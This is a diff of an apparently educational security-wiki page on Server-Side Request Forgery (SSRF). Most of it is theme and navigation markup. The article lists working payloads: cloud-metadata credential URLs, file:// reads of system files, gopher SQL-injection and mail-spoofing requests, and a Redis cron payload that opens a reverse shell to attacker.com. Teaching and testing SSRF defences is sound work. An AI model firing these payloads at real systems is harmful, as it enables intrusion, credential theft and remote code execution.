@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Server-Side Request Forgery (SSRF) # Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.
-Types of SSRF Attacks # 1. Full SSRF # The server returns the full response of the back-end request in the front-end response.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Server-Side Request Forgery (SSRF)" />
-<meta property="og:description" content="Server-Side Request Forgery (SSRF) # Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.
-Types of SSRF Attacks # 1. Full SSRF # The server returns the full response of the back-end request in the front-end response." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Server-Side Request Forgery (SSRF) | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Server-Side Request Forgery (SSRF)# Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.
+Types of SSRF Attacks# 1. Full SSRF# The server returns the full response of the back-end request in the front-end response. Attacker can directly read internal files, metadata, admin panels, etc. Highest impact – often leads to data disclosure or RCE. 2. Blind SSRF# No response is returned to the attacker (or only a boolean/status change). Requires Out-of-Band (OOB) techniques (Burp Collaborator, Interactsh, your own server) to detect. Harder to exploit but still dangerous (port scanning, metadata exfiltration, RCE via gopher). Fundamentals of SSRF# SSRF occurs when a server makes HTTP/TCP requests based on user-controlled input without proper validation or restriction
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Server-Side Request Forgery (SSRF)">
+	<meta property="og:description" content="Server-Side Request Forgery (SSRF)# Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.
+Types of SSRF Attacks# 1. Full SSRF# The server returns the full response of the back-end request in the front-end response. Attacker can directly read internal files, metadata, admin panels, etc. Highest impact – often leads to data disclosure or RCE. 2. Blind SSRF# No response is returned to the attacker (or only a boolean/status change). Requires Out-of-Band (OOB) techniques (Burp Collaborator, Interactsh, your own server) to detect. Harder to exploit but still dangerous (port scanning, metadata exfiltration, RCE via gopher). Fundamentals of SSRF# SSRF occurs when a server makes HTTP/TCP requests based on user-controlled input without proper validation or restriction">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Server-Side Request Forgery (SSRF)">
+	<meta itemprop="description" content="Server-Side Request Forgery (SSRF)# Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.
+Types of SSRF Attacks# 1. Full SSRF# The server returns the full response of the back-end request in the front-end response. Attacker can directly read internal files, metadata, admin panels, etc. Highest impact – often leads to data disclosure or RCE. 2. Blind SSRF# No response is returned to the attacker (or only a boolean/status change). Requires Out-of-Band (OOB) techniques (Burp Collaborator, Interactsh, your own server) to detect. Harder to exploit but still dangerous (port scanning, metadata exfiltration, RCE via gopher). Fundamentals of SSRF# SSRF occurs when a server makes HTTP/TCP requests based on user-controlled input without proper validation or restriction">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2960">
+
+<title>Server-Side Request Forgery (SSRF) • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Server-Side Request Forgery (SSRF)</strong>
+  <h3>Server-Side Request Forgery (SSRF)</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1286,62 +1284,43 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="server-side-request-forgery-ssrf">
-  Server-Side Request Forgery (SSRF)
-  <a class="anchor" href="#server-side-request-forgery-ssrf">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)<a class="anchor" href="#server-side-request-forgery-ssrf">#</a></h1>
 <p>Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to induce the server-side application to make unintended HTTP/TCP requests to arbitrary destinations. The server acts as a proxy for the attacker, enabling access to internal networks, cloud metadata, local files, or external services that are normally unreachable from the outside.</p>
-<h2 id="types-of-ssrf-attacks">
-  Types of SSRF Attacks
-  <a class="anchor" href="#types-of-ssrf-attacks">#</a>
-</h2>
-<h3 id="1-full-ssrf">
-  1. Full SSRF
-  <a class="anchor" href="#1-full-ssrf">#</a>
-</h3>
+<h2 id="types-of-ssrf-attacks">Types of SSRF Attacks<a class="anchor" href="#types-of-ssrf-attacks">#</a></h2>
+<h3 id="1-full-ssrf">1. Full SSRF<a class="anchor" href="#1-full-ssrf">#</a></h3>
 <ul>
 <li>The server returns the full response of the back-end request in the front-end response.</li>
 <li>Attacker can directly read internal files, metadata, admin panels, etc.</li>
 <li>Highest impact – often leads to data disclosure or RCE.</li>
 </ul>
-<h3 id="2-blind-ssrf">
-  2. Blind SSRF
-  <a class="anchor" href="#2-blind-ssrf">#</a>
-</h3>
+<h3 id="2-blind-ssrf">2. Blind SSRF<a class="anchor" href="#2-blind-ssrf">#</a></h3>
 <ul>
 <li>No response is returned to the attacker (or only a boolean/status change).</li>
 <li>Requires Out-of-Band (OOB) techniques (Burp Collaborator, Interactsh, your own server) to detect.</li>
 <li>Harder to exploit but still dangerous (port scanning, metadata exfiltration, RCE via gopher).</li>
 </ul>
-<h2 id="fundamentals-of-ssrf">
-  <strong>Fundamentals of SSRF</strong>
-  <a class="anchor" href="#fundamentals-of-ssrf">#</a>
-</h2>
+<h2 id="fundamentals-of-ssrf"><strong>Fundamentals of SSRF</strong><a class="anchor" href="#fundamentals-of-ssrf">#</a></h2>
 <ul>
 <li>
 <p>SSRF occurs when a server makes HTTP/TCP requests based on <strong>user-controlled input</strong> without proper validation or restriction</p>
 </li>
 <li>
 <p>The key requirement is a <strong>request-sink feature</strong>, such as:</p>
-<pre tabindex="0"><code>URL fetchers, webhooks, image/PDF fetch, import-from-URL, file downloaders, link preview
-</code></pre></li>
+<pre tabindex="0"><code>URL fetchers, webhooks, image/PDF fetch, import-from-URL, file downloaders, link preview</code></pre></li>
 <li>
 <p>Attacker-controlled input is typically passed into backend request functions like:</p>
-<pre tabindex="0"><code>http://, https://, file://, gopher:// (in some stacks)
-</code></pre></li>
+<pre tabindex="0"><code>http://, https://, file://, gopher:// (in some stacks)</code></pre></li>
 <li>
 <p>SSRF relies on the server having <strong>network reachability to internal or external systems</strong>, including:</p>
 <pre tabindex="0"><code>localhost (127.0.0.1)
 private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
 cloud metadata services (169.254.169.254)
-internal admin panels/services
-</code></pre></li>
+internal admin panels/services</code></pre></li>
 <li>
 <p>The vulnerability is usually triggered when input is used in:</p>
 <pre tabindex="0"><code>GET request parameters
 POST body (JSON/XML/form-data)
-headers (Host, Referer, URL fields)
-</code></pre></li>
+headers (Host, Referer, URL fields)</code></pre></li>
 <li>
 <p>SSRF impact depends on <strong>server network privileges</strong>, not the attacker’s local access</p>
 </li>
@@ -1349,81 +1328,58 @@ headers (Host, Referer, URL fields)
 <p>Applications are especially vulnerable when they:</p>
 <pre tabindex="0"><code>do not validate URLs
 allow full URL input from users
-perform server-side fetching without allowlist restrictions
-</code></pre></li>
+perform server-side fetching without allowlist restrictions</code></pre></li>
 <li>
 <p>SSRF can often be chained with:</p>
 <pre tabindex="0"><code>open redirect → internal scanning
 DNS rebinding → bypass filters
 cloud metadata access → credential theft
-protocol abuse → gopher/file schemes
-</code></pre></li>
+protocol abuse → gopher/file schemes</code></pre></li>
 <li>
 <p>Detection often starts by modifying request destinations to:</p>
-<pre tabindex="0"><code>localhost, 127.0.0.1, internal IPs, or collaborator URLs
-</code></pre></li>
+<pre tabindex="0"><code>localhost, 127.0.0.1, internal IPs, or collaborator URLs</code></pre></li>
 <li>
 <p>A key indicator is when the server <strong>initiates a request on behalf of the user without strict destination control</strong></p>
 </li>
 </ul>
-<h3 id="basic-payloads">
-  Basic Payloads
-  <a class="anchor" href="#basic-payloads">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://127.0.0.1
+<h3 id="basic-payloads">Basic Payloads<a class="anchor" href="#basic-payloads">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://127.0.0.1
 </span></span><span style="display:flex;"><span>http://localhost
 </span></span><span style="display:flex;"><span>http://localhost:8080
 </span></span><span style="display:flex;"><span>http://169.254.169.254/latest/meta-data/
 </span></span><span style="display:flex;"><span>http://169.254.169.254/latest/meta-data/iam/security-credentials/
-</span></span><span style="display:flex;"><span>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
-</span></span></code></pre></div><h3 id="protocol-based-payloads">
-  Protocol-Based Payloads
-  <a class="anchor" href="#protocol-based-payloads">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/</span></span></code></pre></div><h3 id="protocol-based-payloads">Protocol-Based Payloads<a class="anchor" href="#protocol-based-payloads">#</a></h3>
 <p>Once basic HTTP/HTTPS SSRF is confirmed and filters are bypassed, escalate using non-HTTP protocols supported by the vulnerable language/library (cURL, Java URL, PHP streams, etc.).</p>
 <p><strong>1. file:// – Local File Read</strong></p>
 <p>Directly access files on the server filesystem.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file:///etc/passwd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file:///etc/passwd
 </span></span><span style="display:flex;"><span>file:///proc/self/environ
 </span></span><span style="display:flex;"><span>file:///var/log/apache2/access.log
-</span></span><span style="display:flex;"><span>file:///app/config.php
-</span></span></code></pre></div><p><strong>2. dict:// – DICT Protocol Interaction</strong></p>
+</span></span><span style="display:flex;"><span>file:///app/config.php</span></span></code></pre></div><p><strong>2. dict:// – DICT Protocol Interaction</strong></p>
 <p>Useful when dict:// is allowed. Can leak server info or authenticate to internal DICT servers.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dict://127.0.0.1:11211/stats
-</span></span><span style="display:flex;"><span>dict://user:pass@internal-dict:2628/d:word:database:1
-</span></span></code></pre></div><p><strong>3. sftp:// – Force Connection to Malicious SFTP</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dict://127.0.0.1:11211/stats
+</span></span><span style="display:flex;"><span>dict://user:pass@internal-dict:2628/d:word:database:1</span></span></code></pre></div><p><strong>3. sftp:// – Force Connection to Malicious SFTP</strong></p>
 <p>Triggers connection to attacker-controlled SFTP server (great for OOB confirmation).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sftp</span><span style="color:#f92672">:</span><span style="color:#75715e">//your-server.com:2222/
-</span></span></span></code></pre></div><p><strong>4. tftp:// – UDP-Based File Retrieval</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sftp</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//your-server.com:2222/</span></span></span></code></pre></div><p><strong>4. tftp:// – UDP-Based File Retrieval</strong></p>
 <p>cURL supports TFTP. Send UDP packet to any internal host.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tftp://192.168.0.10:69/TESTUDPPACKET
-</span></span><span style="display:flex;"><span>tftp://127.0.0.1:69/boot.ini
-</span></span></code></pre></div><p><strong>5. ldap://  – LDAP Query Execution</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tftp://192.168.0.10:69/TESTUDPPACKET
+</span></span><span style="display:flex;"><span>tftp://127.0.0.1:69/boot.ini</span></span></code></pre></div><p><strong>5. ldap://  – LDAP Query Execution</strong></p>
 <p>Interact with internal LDAP servers (e.g., Memcached via LDAP wrapper).</p>
 <p>text</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldap://127.0.0.1:11211/%0astats%0aquit
-</span></span><span style="display:flex;"><span>ldaps://internal-ldap.corp:636/dc<span style="color:#f92672">=</span>corp,dc<span style="color:#f92672">=</span>com
-</span></span></code></pre></div><p><strong>6. SMTP via gopher:// – Send Emails from Internal Server</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldap://127.0.0.1:11211/%0astats%0aquit
+</span></span><span style="display:flex;"><span>ldaps://internal-ldap.corp:636/dc<span style="color:#f92672">=</span>corp,dc<span style="color:#f92672">=</span>com</span></span></code></pre></div><p><strong>6. SMTP via gopher:// – Send Emails from Internal Server</strong></p>
 <p>Exploit internal mail servers (Sendmail, Postfix) to spoof emails or extract internal hostnames from banner.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:%3Chacker@evil.com%3E%0d%0aRCPT%20TO:%3Cvictim@corp.com%3E%0d%0aDATA%0d%0aSubject:%20SSRF%20Test%0d%0a%0d%0aPwned%20:%29%0d%0a.%0d%0aQUIT%0d%0a
-</span></span></code></pre></div><p>→ Banner often leaks internal domain: <code>220 mail.internal.corp ESMTP</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:%3Chacker@evil.com%3E%0d%0aRCPT%20TO:%3Cvictim@corp.com%3E%0d%0aDATA%0d%0aSubject:%20SSRF%20Test%0d%0a%0d%0aPwned%20:%29%0d%0a.%0d%0aQUIT%0d%0a</span></span></code></pre></div><p>→ Banner often leaks internal domain: <code>220 mail.internal.corp ESMTP</code></p>
 <p><strong>7. gopher:// – Universal TCP Client</strong></p>
 <p>Send raw bytes to any TCP service (Redis, MySQL, PostgreSQL, FastCGI, HTTP, etc.).</p>
 <p><strong>HTTP Request</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
-</span></span><span style="display:flex;"><span>gopher://127.0.0.1:8000/_POST%20/login%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aCookie:%20admin<span style="color:#f92672">=</span>true%0d%0a%0d%0ausername<span style="color:#f92672">=</span>admin%27%20or%201<span style="color:#f92672">=</span>1--
-</span></span></code></pre></div><p><strong>Redis RCE</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$%d%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1%0d%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$%d%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
